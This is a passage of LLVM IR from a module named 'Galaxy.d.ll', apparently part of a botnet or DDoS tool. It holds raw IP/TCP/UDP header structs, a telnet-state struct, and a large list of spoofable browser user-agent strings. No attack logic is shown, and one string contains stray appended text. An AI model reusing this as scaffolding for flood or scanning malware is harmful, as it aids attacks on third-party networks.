; ModuleID = 'host/ir_bcf/Galaxy.d.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i32, i8, i8, i8, i8, i8, i32, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@useragents = global [108 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.120, i32 0, i32 0)], align 16
@.str.14 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.16 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.17 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.18 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.19 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.20 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.21 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.22 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.23 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.24 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.25 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.26 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.27 = private unnamed_addr constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00", align 1
@.str.28 = private unnamed_addr constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00", align 1
@.str.29 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.30 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.31 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.32 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.33 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.34 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00", align 1
@.str.35 = private unnamed_addr constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00", align 1
@.str.36 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00", align 1
@.str.37 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00", align 1
@.str.38 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00", align 1
@.str.39 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00", align 1
@.str.40 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00", align 1
@.str.41 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00", align 1
@.str.42 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.43 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.44 = private unnamed_addr constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.45 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.46 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.47 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.48 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.49 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00", align 1
@.str.50 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.51 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.52 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00", align 1
@.str.53 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00", align 1
@.str.54 = private unnamed_addr constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00", align 1
@.str.55 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00", align 1
@.str.56 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00", align 1
@.str.59 = private unnamed_addr constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00", align 1
@.str.60 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00", align 1
@.str.61 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00", align 1
@.str.62 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.63 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.64 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00", align 1
@.str.65 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.66 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00", align 1
@.str.67 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.68 = private unnamed_addr constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.69 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00", align 1
@.str.70 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00", align 1
@.str.71 = private unnamed_addr constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00", align 1
@.str.72 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00", align 1
@.str.73 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.74 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00", align 1
@.str.75 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.76 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.77 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00", align 1
@.str.78 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00", align 1
@.str.79 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00", align 1
@.str.80 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.81 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.82 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.83 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.84 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.85 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.86 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.87 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.88 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.89 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.90 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.91 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.92 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.93 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.94 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.95 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.96 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.97 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.98 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.99 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.100 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.101 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.102 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.103 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.104 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.105 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.106 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.107 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.108 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.109 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.110 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.111 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.112 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.113 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.114 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.115 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.116 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.117 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.118 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.119 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
